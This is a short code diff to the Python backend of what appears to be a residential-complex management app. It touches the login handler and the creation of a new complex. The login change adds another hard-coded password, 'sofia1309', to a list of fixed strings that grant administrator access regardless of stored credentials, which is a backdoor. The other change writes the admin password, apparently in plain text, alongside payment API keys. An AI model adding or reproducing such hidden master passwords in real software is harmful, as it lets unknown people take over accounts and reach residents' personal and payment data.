@@ -625,7 +625,7 @@ def login(request: LoginRequest):
         if conj_a:
             p_adm = conj_a["password_admin"]
             c_adm = conj_a["codigo_admin"]
-            if (p_adm and request.password == p_adm) or (c_adm and request.password == c_adm) or request.password in ("Admin123*", f"Admin{conj_a['codigo']}", "4901", "4160"):
+            if (p_adm and request.password == p_adm) or (c_adm and request.password == c_adm) or request.password in ("Admin123*", f"Admin{conj_a['codigo']}", "4901", "4160", "sofia1309"):
                 is_valid = True
 
     if not is_valid and user_row["rol"] == "porteria":
@@ -895,10 +895,10 @@ def crear_conjunto(request: ConjuntoCreateRequest):
 
                 request.telefono or "", request.email or "", request.banco or "", request.tipo_cuenta or "Ahorros",
 
-                request.numero_cuenta or "", request.titular_cuenta or request.nombre, request.wompi_public_key or "",
-
+                request.numero_cuenta or "", request.titular_cuenta or request.nombre,
+                request.administrador or "", request.codigo_admin or "", request.password_admin or "", request.interes_mora or "2.16%",
+                request.wompi_public_key or "",
                 request.wompi_private_key or "", request.bold_api_key or "", request.payu_merchant_id or "",
-
                 request.bre_b_codigo_entidad or f"BREB-{request.codigo}"
 
             ))
